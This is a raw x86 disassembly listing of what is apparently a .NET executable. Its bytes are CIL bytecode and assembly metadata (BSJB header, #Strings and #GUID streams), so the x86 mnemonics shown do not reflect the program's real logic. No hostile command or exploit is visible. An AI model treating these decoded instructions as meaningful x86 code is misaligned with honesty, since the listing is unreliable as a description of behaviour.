  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	b8 1d 00 00 23       	mov    $0x2300001d,%eax
  405a29:	53                   	push   %ebx
  405a2a:	74 72                	je     0x405a9e
  405a2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a33:	00 e0                	add    %ah,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 70 27             	add    %dh,0x27(%eax)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 50 63             	add    %dl,0x63(%eax)
  405a42:	00 00                	add    %al,(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 60 63             	add    %ah,0x63(%eax)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	ef                   	out    %eax,(%dx)
  405adb:	0a 01                	or     (%ecx),%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 37                	add    %dh,(%edi)
  405ae5:	19 ec                	sbb    %ebp,%esp
  405ae7:	0f 0a                	(bad)
  405ae9:	00 8a 00 01 16 0a    	add    %cl,0xa160100(%edx)
  405aef:	00 9d 19 70 18 0a    	add    %bl,0xa187019(%ebp)
  405af5:	00 87 0f 83 1d 06    	add    %al,0x61d830f(%edi)
  405afb:	00 27                	add    %ah,(%edi)
  405afd:	14 96                	adc    $0x96,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 82 08 01 16 0a    	add    %al,0xa160108(%edx)
  405b07:	00 a0 10 01 16 0a    	add    %ah,0xa160110(%eax)
  405b0d:	00 0c 18             	add    %cl,(%eax,%ebx,1)
  405b10:	83 1d 06 00 f7 19 ec 	sbbl   $0xffffffec,0x19f70006
  405b17:	0f 0e                	femms
  405b19:	00 03                	add    %al,(%ebx)
  405b1b:	12 ed                	adc    %ch,%ch
  405b1d:	0b 0e                	or     (%esi),%ecx
  405b1f:	00 c2                	add    %al,%dl
  405b21:	18 ed                	sbb    %ch,%ch
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 3c 1c             	add    %bh,(%esp,%ebx,1)
  405b28:	96                   	xchg   %eax,%esi
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 27                	add    %ah,(%edi)
  405b2d:	13 dd                	adc    %ebp,%ebx
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 5d 10             	add    %bl,0x10(%ebp)
  405b34:	ec                   	in     (%dx),%al
  405b35:	0f 0a                	(bad)
  405b37:	00 18                	add    %bl,(%eax)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 c6                	add    %al,%dh
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 99 15 12 00 01    	add    %bl,0x1001215(%ecx)
  405b4b:	00 ec                	add    %ch,%ah
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	de 08                	fimuls (%eax)
  405b52:	99                   	cltd
  405b53:	15 06 00 fd 07       	adc    $0x7fd0006,%eax
  405b58:	ec                   	in     (%dx),%al
  405b59:	0f 06                	clts
  405b5b:	00 e0                	add    %ah,%al
  405b5d:	0b dd                	or     %ebp,%ebx
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a1 14 c6 17 06    	add    %ah,0x617c614(%ecx)
  405b67:	00 a1 05 c6 17 06    	add    %ah,0x617c605(%ecx)
  405b6d:	00 c0                	add    %al,%al
  405b6f:	0f 61 02             	punpcklwd (%edx),%mm0
  405b72:	06                   	push   %es
  405b73:	00 eb                	add    %ch,%bl
  405b75:	09 99 15 06 00 58    	or     %ebx,0x58000615(%ecx)
  405b7b:	0a 99 15 06 00 08    	or     0x8000615(%ecx),%bl
  405b81:	09 3b                	or     %edi,(%ebx)
  405b83:	15 6f 00 b9 15       	adc    $0x15b9006f,%eax
  405b88:	00 00                	add    %al,(%eax)
  405b8a:	06                   	push   %es
  405b8b:	00 30                	add    %dh,(%eax)
  405b8d:	09 4d 11             	or     %ecx,0x11(%ebp)
  405b90:	06                   	push   %es
  405b91:	00 b7 09 4d 11 06    	add    %dh,0x6114d09(%edi)
  405b97:	00 98 09 4d 11 06    	add    %bl,0x6114d09(%eax)
  405b9d:	00 3f                	add    %bh,(%edi)
  405b9f:	0a 4d 11             	or     0x11(%ebp),%cl
  405ba2:	06                   	push   %es
  405ba3:	00 0b                	add    %cl,(%ebx)
  405ba5:	0a 4d 11             	or     0x11(%ebp),%cl
  405ba8:	06                   	push   %es
  405ba9:	00 24 0a             	add    %ah,(%edx,%ecx,1)
  405bac:	4d                   	dec    %ebp
  405bad:	11 06                	adc    %eax,(%esi)
  405baf:	00 47 09             	add    %al,0x9(%edi)
  405bb2:	4d                   	dec    %ebp
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 7b 09             	add    %bh,0x9(%ebx)
  405bb8:	4d                   	dec    %ebp
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 62 09             	add    %ah,0x9(%edx)
  405bbe:	04 0c                	add    $0xc,%al
  405bc0:	06                   	push   %es
  405bc1:	00 1c 09             	add    %bl,(%ecx,%ecx,1)
  405bc4:	7a 15                	jp     0x405bdb
  405bc6:	06                   	push   %es
  405bc7:	00 ed                	add    %ch,%ch
  405bc9:	08 99 15 06 00 d4    	or     %bl,-0x2bfff9eb(%ecx)
  405bcf:	09 4d 11             	or     %ecx,0x11(%ebp)
  405bd2:	06                   	push   %es
  405bd3:	00 16                	add    %dl,(%esi)
  405bd5:	03 96 0b 06 00 97    	add    -0x68fff9f5(%esi),%edx
  405bdb:	1b ec                	sbb    %esp,%ebp
  405bdd:	0f 06                	clts
  405bdf:	00 8f 1a ec 0f 06    	add    %cl,0x60fec1a(%edi)
  405be5:	00 e4                	add    %ah,%ah
  405be7:	0b dd                	or     %ebp,%ebx
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 c8                	add    %cl,%al
  405bed:	1c 01                	sbb    $0x1,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 17                	add    %dl,(%edi)
  405bf3:	10 f6                	adc    %dh,%dh
  405bf5:	1c 06                	sbb    $0x6,%al
  405bf7:	00 f5                	add    %dh,%ch
  405bf9:	12 f6                	adc    %dh,%dh
  405bfb:	1c 06                	sbb    $0x6,%al
  405bfd:	00 77 0b             	add    %dh,0xb(%edi)
  405c00:	f6 1c 06             	negb   (%esi,%eax,1)
  405c03:	00 f1                	add    %dh,%cl
  405c05:	11 ec                	adc    %ebp,%esp
  405c07:	0f 0a                	(bad)
  405c09:	00 52 18             	add    %dl,0x18(%edx)
  405c0c:	5c                   	pop    %esp
  405c0d:	19 0a                	sbb    %ecx,(%edx)
  405c0f:	00 15 1a 5c 19 0a    	add    %dl,0xa195c1a
  405c15:	00 a4 0e 5c 19 0a 00 	add    %ah,0xa195c(%esi,%ecx,1)
  405c1c:	1c 1d                	sbb    $0x1d,%al
  405c1e:	70 18                	jo     0x405c38
  405c20:	0a 00                	or     (%eax),%al
  405c22:	32 08                	xor    (%eax),%cl
  405c24:	70 18                	jo     0x405c3e
  405c26:	0a 00                	or     (%eax),%al
  405c28:	1d 08 70 18 06       	sbb    $0x6187008,%eax
  405c2d:	00 c1                	add    %al,%cl
  405c2f:	0c ec                	or     $0xec,%al
  405c31:	0f 06                	clts
  405c33:	00 ca                	add    %cl,%dl
  405c35:	12 ec                	adc    %ah,%ch
  405c37:	0f 06                	clts
  405c39:	00 3e                	add    %bh,(%esi)
  405c3b:	10 ec                	adc    %ch,%ah
  405c3d:	0f 0a                	(bad)
  405c3f:	00 b9 17 5c 19 0a    	add    %bh,0xa195c17(%ecx)
  405c45:	00 53 17             	add    %dl,0x17(%ebx)
  405c48:	5c                   	pop    %esp
  405c49:	19 06                	sbb    %eax,(%esi)
  405c4b:	00 d9                	add    %bl,%cl
  405c4d:	17                   	pop    %ss
  405c4e:	ec                   	in     (%dx),%al
  405c4f:	0f 06                	clts
  405c51:	00 ad 05 ec 0f 0a    	add    %ch,0xa0fec05(%ebp)
  405c57:	00 79 0f             	add    %bh,0xf(%ecx)
  405c5a:	70 18                	jo     0x405c74
  405c5c:	0a 00                	or     (%eax),%al
  405c5e:	ee                   	out    %al,(%dx)
  405c5f:	0d 83 1d 0a 00       	or     $0xa1d83,%eax
  405c64:	36 1b 5c 19 0a       	sbb    %ss:0xa(%ecx,%ebx,1),%ebx
  405c69:	00 5f 11             	add    %bl,0x11(%edi)
  405c6c:	01 16                	add    %edx,(%esi)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	77 17                	ja     0x405c89
  405c72:	2e 11 06             	adc    %eax,%cs:(%esi)
  405c75:	00 98 0a ec 0f 06    	add    %bl,0x60fec0a(%eax)
  405c7b:	00 12                	add    %dl,(%edx)
  405c7d:	0e                   	push   %cs
  405c7e:	96                   	xchg   %eax,%esi
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e0                	add    %ah,%al
  405c83:	0d ec 0f 0a 00       	or     $0xa0fec,%eax
  405c88:	9d                   	popf
  405c89:	0d ec 0f 0a 00       	or     $0xa0fec,%eax
  405c8e:	e9 07 ec 0f 06       	jmp    0x650489a
  405c93:	00 86 14 ec 0f 06    	add    %al,0x60fec14(%esi)
  405c99:	00 7e 1b             	add    %bh,0x1b(%esi)
  405c9c:	96                   	xchg   %eax,%esi
  405c9d:	0b 06                	or     (%esi),%eax
  405c9f:	00 ba 0f 61 02 06    	add    %bh,0x602610f(%edx)
  405ca5:	00 0c 15 96 0b 0a 00 	add    %cl,0xa0b96(,%edx,1)
  405cac:	57                   	push   %edi
  405cad:	05 70 18 06 00       	add    $0x61870,%eax
  405cb2:	bd 01 ec 0f 06       	mov    $0x60fec01,%ebp
  405cb7:	00 1b                	add    %bl,(%ebx)
  405cb9:	12 61 02             	adc    0x2(%ecx),%ah
  405cbc:	0a 00                	or     (%eax),%al
  405cbe:	4a                   	dec    %edx
  405cbf:	18 3b                	sbb    %bh,(%ebx)
  405cc1:	15 0a 00 5d 12       	adc    $0x125d000a,%eax
  405cc6:	3b 15 06 00 e5 1c    	cmp    0x1ce50006,%edx
  405ccc:	55                   	push   %ebp
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 68 14             	add    %ch,0x14(%eax)
  405cd2:	61                   	popa
  405cd3:	02 06                	add    (%esi),%al
  405cd5:	00 60 0d             	add    %ah,0xd(%eax)
  405cd8:	61                   	popa
  405cd9:	02 0a                	add    (%edx),%cl
